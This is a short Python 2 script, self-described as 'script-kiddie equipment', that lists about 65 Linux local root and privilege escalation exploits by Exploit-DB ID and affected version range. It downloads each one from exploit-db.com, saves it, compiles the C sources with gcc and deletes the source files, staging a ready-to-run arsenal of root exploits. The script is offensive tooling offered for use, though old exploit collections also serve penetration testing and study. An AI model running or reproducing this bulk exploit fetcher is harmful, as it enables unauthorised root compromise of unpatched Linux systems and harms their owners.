#!/usr/bin/env python
# -*- coding: utf-8 -*-

# script-kiddie equipment
# this is my ability to think "outside the box" ;)

# part 2: https://raw.githubusercontent.com/adamziaja/bash/master/intruder.sh

# (C) 2015 Adam Ziaja <adam@adamziaja.com> http://adamziaja.com

import os
import urllib2

# http://www.securitysift.com/download/linuxprivchecker.py
sploits= {
        "2.2.x-2.4.x ptrace kmod local exploit":{"minver":"2.2", "maxver":"2.4.99", "exploitdb":"3", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "< 2.4.20 Module Loader Local Root Exploit":{"minver":"0", "maxver":"2.4.20", "exploitdb":"12", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        #"2.4.22 "'do_brk()'" local Root Exploit (PoC)":{"minver":"2.4.22", "maxver":"2.4.22", "exploitdb":"129", "lang":"asm", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "<= 2.4.22 (do_brk) Local Root Exploit (working)":{"minver":"0", "maxver":"2.4.22", "exploitdb":"131", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4.x mremap() bound checking Root Exploit":{"minver":"2.4", "maxver":"2.4.99", "exploitdb":"145", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "<= 2.4.29-rc2 uselib() Privilege Elevation":{"minver":"0", "maxver":"2.4.29", "exploitdb":"744", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4 uselib() Privilege Elevation Exploit":{"minver":"2.4", "maxver":"2.4", "exploitdb":"778", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4.x / 2.6.x uselib() Local Privilege Escalation Exploit":{"minver":"2.4", "maxver":"2.6.99", "exploitdb":"895", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4/2.6 bluez Local Root Privilege Escalation Exploit (update)":{"minver":"2.4", "maxver":"2.6.99", "exploitdb":"926", "lang":"c", "keywords":{"loc":["proc","pkg"], "val":"bluez"}},
        "<= 2.6.11 (CPL 0) Local Root Exploit (k-rad3.c)":{"minver":"0", "maxver":"2.6.11", "exploitdb":"1397", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit":{"minver":"0", "maxver":"99", "exploitdb":"1518", "lang":"c", "keywords":{"loc":["proc","pkg"], "val":"mysql"}},
        "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit":{"minver":"2.6.13", "maxver":"2.6.17.4", "exploitdb":"2004", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (2)":{"minver":"2.6.13", "maxver":"2.6.17.4", "exploitdb":"2005", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (3)":{"minver":"2.6.13", "maxver":"2.6.17.4", "exploitdb":"2006", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (4)":{"minver":"2.6.13", "maxver":"2.6.17.4", "exploitdb":"2011", "lang":"sh", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "<= 2.6.17.4 (proc) Local Root Exploit":{"minver":"0", "maxver":"2.6.17.4", "exploitdb":"2013", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.6.13 <= 2.6.17.4 prctl() Local Root Exploit (logrotate)":{"minver":"2.6.13", "maxver":"2.6.17.4", "exploitdb":"2031", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "Ubuntu/Debian Apache 1.3.33/1.3.34 (CGI TTY) Local Root Exploit":{"minver":"4.10", "maxver":"7.04", "exploitdb":"3384", "lang":"c", "keywords":{"loc":["os"], "val":"debian"}},
        "Linux/Kernel 2.4/2.6 x86-64 System Call Emulation Exploit":{"minver":"2.4", "maxver":"2.6", "exploitdb":"4460", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "< 2.6.11.5 BLUETOOTH Stack Local Root Exploit":{"minver":"0", "maxver":"2.6.11.5", "exploitdb":"4756", "lang":"c", "keywords":{"loc":["proc","pkg"], "val":"bluetooth"}},
        "2.6.17 - 2.6.24.1 vmsplice Local Root Exploit":{"minver":"2.6.17", "maxver":"2.6.24.1", "exploitdb":"5092", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.6.23 - 2.6.24 vmsplice Local Root Exploit":{"minver":"2.6.23", "maxver":"2.6.24", "exploitdb":"5093", "lang":"c", "keywords":{"loc":["os"], "val":"debian"}},
        "Debian OpenSSL Predictable PRNG Bruteforce SSH Exploit":{"minver":"0", "maxver":"99", "exploitdb":"5720", "lang":"python", "keywords":{"loc":["os"], "val":"debian"}},
        "Linux Kernel < 2.6.22 ftruncate()/open() Local Exploit":{"minver":"0", "maxver":"2.6.22", "exploitdb":"6851", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "< 2.6.29 exit_notify() Local Privilege Escalation Exploit":{"minver":"0", "maxver":"2.6.29", "exploitdb":"8369", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.6 UDEV Local Privilege Escalation Exploit":{"minver":"2.6", "maxver":"2.6.99", "exploitdb":"8478", "lang":"c", "keywords":{"loc":["proc","pkg"], "val":"udev"}},
        "2.6 UDEV < 141 Local Privilege Escalation Exploit":{"minver":"2.6", "maxver":"2.6.99", "exploitdb":"8572", "lang":"c", "keywords":{"loc":["proc","pkg"], "val":"udev"}},
        "2.6.x ptrace_attach Local Privilege Escalation Exploit":{"minver":"2.6", "maxver":"2.6.99", "exploitdb":"8673", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.6.29 ptrace_attach() Local Root Race Condition Exploit":{"minver":"2.6.29", "maxver":"2.6.29", "exploitdb":"8678", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "Linux Kernel <=2.6.28.3 set_selection() UTF-8 Off By One Local Exploit":{"minver":"0", "maxver":"2.6.28.3", "exploitdb":"9083", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "Test Kernel Local Root Exploit 0day":{"minver":"2.6.18", "maxver":"2.6.30", "exploitdb":"9191", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "PulseAudio (setuid) Priv. Escalation Exploit (ubu/9.04)(slack/12.2.0)":{"minver":"2.6.9", "maxver":"2.6.30", "exploitdb":"9208", "lang":"c", "keywords":{"loc":["pkg"], "val":"pulse"}},
        "2.x sock_sendpage() Local Ring0 Root Exploit":{"minver":"2", "maxver":"2.99", "exploitdb":"9435", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.x sock_sendpage() Local Root Exploit 2":{"minver":"2", "maxver":"2.99", "exploitdb":"9436", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4/2.6 sock_sendpage() ring0 Root Exploit (simple ver)":{"minver":"2.4", "maxver":"2.6.99", "exploitdb":"9479", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.6 < 2.6.19 (32bit) ip_append_data() ring0 Root Exploit":{"minver":"2.6", "maxver":"2.6.19", "exploitdb":"9542", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4/2.6 sock_sendpage() Local Root Exploit (ppc)":{"minver":"2.4", "maxver":"2.6.99", "exploitdb":"9545", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "< 2.6.19 udp_sendmsg Local Root Exploit (x86/x64)":{"minver":"0", "maxver":"2.6.19", "exploitdb":"9574", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "< 2.6.19 udp_sendmsg Local Root Exploit":{"minver":"0", "maxver":"2.6.19", "exploitdb":"9575", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4/2.6 sock_sendpage() Local Root Exploit [2]":{"minver":"2.4", "maxver":"2.6.99", "exploitdb":"9598", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4/2.6 sock_sendpage() Local Root Exploit [3]":{"minver":"2.4", "maxver":"2.6.99", "exploitdb":"9641", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4.1-2.4.37 and 2.6.1-2.6.32-rc5 Pipe.c Privelege Escalation":{"minver":"2.4.1", "maxver":"2.6.32", "exploitdb":"9844", "lang":"python", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "'pipe.c' Local Privilege Escalation Vulnerability":{"minver":"2.4.1", "maxver":"2.6.32", "exploitdb":"10018", "lang":"sh", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.6.18-20 2009 Local Root Exploit":{"minver":"2.6.18", "maxver":"2.6.20", "exploitdb":"10613", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "Apache Spamassassin Milter Plugin Remote Root Command Execution":{"minver":"0", "maxver":"99", "exploitdb":"11662", "lang":"sh", "keywords":{"loc":["proc"], "val":"spamass-milter"}},
        "<= 2.6.34-rc3 ReiserFS xattr Privilege Escalation":{"minver":"0", "maxver":"2.6.34", "exploitdb":"12130", "lang":"python", "keywords":{"loc":["mnt"], "val":"reiser"}},
        "Ubuntu PAM MOTD local root":{"minver":"7", "maxver":"10.04", "exploitdb":"14339", "lang":"sh", "keywords":{"loc":["os"], "val":"ubuntu"}},
        "< 2.6.36-rc1 CAN BCM Privilege Escalation Exploit":{"minver":"0", "maxver":"2.6.36", "exploitdb":"14814", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "Kernel ia32syscall Emulation Privilege Escalation":{"minver":"0", "maxver":"99", "exploitdb":"15023", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "Linux RDS Protocol Local Privilege Escalation":{"minver":"0", "maxver":"2.6.36", "exploitdb":"15285", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "<= 2.6.37 Local Privilege Escalation":{"minver":"0", "maxver":"2.6.37", "exploitdb":"15704", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "< 2.6.37-rc2 ACPI custom_method Privilege Escalation":{"minver":"0", "maxver":"2.6.37", "exploitdb":"15774", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "CAP_SYS_ADMIN to root Exploit":{"minver":"0", "maxver":"99", "exploitdb":"15916", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit)":{"minver":"0", "maxver":"99", "exploitdb":"15944", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "< 2.6.36.2 Econet Privilege Escalation Exploit":{"minver":"0", "maxver":"2.6.36.2", "exploitdb":"17787", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "Sendpage Local Privilege Escalation":{"minver":"0", "maxver":"99", "exploitdb":"19933", "lang":"ruby", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.4.18/19 Privileged File Descriptor Resource Exhaustion Vulnerability":{"minver":"2.4.18", "maxver":"2.4.19", "exploitdb":"21598", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.2.x/2.4.x Privileged Process Hijacking Vulnerability (1)":{"minver":"2.2", "maxver":"2.4.99", "exploitdb":"22362", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "2.2.x/2.4.x Privileged Process Hijacking Vulnerability (2)":{"minver":"2.2", "maxver":"2.4.99", "exploitdb":"22363", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "Samba 2.2.8 Share Local Privilege Elevation Vulnerability":{"minver":"2.2.8", "maxver":"2.2.8", "exploitdb":"23674", "lang":"c", "keywords":{"loc":["proc","pkg"], "val":"samba"}},
        "open-time Capability file_ns_capable() - Privilege Escalation Vulnerability":{"minver":"0", "maxver":"99", "exploitdb":"25307", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
        "open-time Capability file_ns_capable() Privilege Escalation":{"minver":"0", "maxver":"99", "exploitdb":"25450", "lang":"c", "keywords":{"loc":["kernel"], "val":"kernel"}},
}

for sploit in sploits:
    expl = sploits[sploit]["exploitdb"]
    print expl

    exploitdb = 'http://exploit-db.com/download/'+expl
    response = urllib2.urlopen(exploitdb)

    if sploits[sploit]["lang"] is 'ruby':
        lang = 'rb'
    elif sploits[sploit]["lang"] is 'python':
        lang = 'py'
    else:
        lang = sploits[sploit]["lang"]
    source = expl+'.'+lang

    f = open(source, 'w')
    f.write(response.read())
    f.close()

    if lang is 'c':
        cmd = 'gcc -o ' + expl + ' ' + source
        os.system(cmd)
        cmd = 'rm ' + source
        os.system(cmd)
